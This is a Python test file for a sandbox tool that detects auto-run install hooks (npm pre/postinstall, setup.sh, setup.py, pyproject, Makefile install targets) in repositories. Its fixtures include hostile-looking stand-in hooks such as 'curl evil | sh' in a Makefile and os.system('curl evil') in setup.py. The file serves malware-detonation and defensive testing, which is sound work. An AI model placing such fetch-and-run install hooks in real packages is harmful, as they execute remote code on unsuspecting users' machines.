"""Entry detection must find only auto-run setup triggers and skip cleanly when
there is nothing an agent would autonomously execute."""
from __future__ import annotations

import json

from runner.sandbox.entry import detect_entry


def _pkg(tmp_path, scripts):
    (tmp_path / "package.json").write_text(json.dumps({"name": "x", "scripts": scripts}))
    return str(tmp_path)


def test_npm_postinstall_is_detected(tmp_path):
    e = detect_entry(_pkg(tmp_path, {"postinstall": "node setup.js"}))
    assert e.ecosystem == "npm" and e.cmd == ("npm", "run", "postinstall", "--silent")
    assert e.source == "package.json:scripts.postinstall"


def test_npm_lifecycle_priority_preinstall_first(tmp_path):
    e = detect_entry(_pkg(tmp_path, {"postinstall": "a", "preinstall": "b"}))
    assert e.cmd == ("npm", "run", "preinstall", "--silent")  # runs earliest → detonate it


def test_npm_without_auto_scripts_is_ignored(tmp_path):
    # `test`/`build` are not auto-run by install → nothing to detonate here.
    assert detect_entry(_pkg(tmp_path, {"test": "jest", "build": "tsc"})) is None


def test_setup_script_detected(tmp_path):
    (tmp_path / "setup.sh").write_text("#!/bin/sh\necho hi\n")
    e = detect_entry(str(tmp_path))
    assert e.ecosystem == "shell" and e.cmd == ("sh", "setup.sh") and e.source == "setup.sh"


def test_npm_wins_over_setup_script(tmp_path):
    (tmp_path / "setup.sh").write_text("echo hi")
    e = detect_entry(_pkg(tmp_path, {"postinstall": "node x"}))
    assert e.ecosystem == "npm"


def test_no_entry_returns_none(tmp_path):
    (tmp_path / "README.md").write_text("nothing runnable here")
    assert detect_entry(str(tmp_path)) is None


def test_malformed_package_json_is_skipped(tmp_path):
    (tmp_path / "package.json").write_text("{ this is not json")
    assert detect_entry(str(tmp_path)) is None


def test_non_dict_scripts_is_skipped(tmp_path):
    # A hostile package.json could put anything in "scripts" — a non-object is
    # not runnable, don't crash on it.
    (tmp_path / "package.json").write_text('{"name": "x", "scripts": "not-an-object"}')
    assert detect_entry(str(tmp_path)) is None


def test_missing_repo_returns_none():
    assert detect_entry("/no/such/repo/here") is None


def test_npm_entry_captures_script_body(tmp_path):
    e = detect_entry(_pkg(tmp_path, {"postinstall": "node evil.js"}))
    assert e.body == "node evil.js"


def test_shell_entry_captures_script_body(tmp_path):
    (tmp_path / "setup.sh").write_text("#!/bin/sh\neval $(echo x)\n")
    e = detect_entry(str(tmp_path))
    assert "eval" in e.body


def test_pip_setup_py_detected(tmp_path):
    (tmp_path / "setup.py").write_text("import os; os.system('curl evil')")
    e = detect_entry(str(tmp_path))
    assert e and e.ecosystem == "python" and e.cmd[:2] == ("pip", "install")
    assert e.source == "setup.py"


def test_pip_pyproject_detected(tmp_path):
    (tmp_path / "pyproject.toml").write_text("[build-system]\n")
    e = detect_entry(str(tmp_path))
    assert e and e.ecosystem == "python"


def test_makefile_install_target_detected(tmp_path):
    (tmp_path / "Makefile").write_text("install:\n\tcurl evil | sh\n")
    e = detect_entry(str(tmp_path))
    assert e and e.cmd == ("make", "install") and e.ecosystem == "shell"


def test_makefile_without_setup_target_skips(tmp_path):
    (tmp_path / "Makefile").write_text("build:\n\tgcc x.c\n")
    assert detect_entry(str(tmp_path)) is None


def test_npm_wins_over_pip(tmp_path):
    (tmp_path / "package.json").write_text('{"scripts":{"postinstall":"node x"}}')
    (tmp_path / "setup.py").write_text("import os")
    assert detect_entry(str(tmp_path)).ecosystem == "npm"
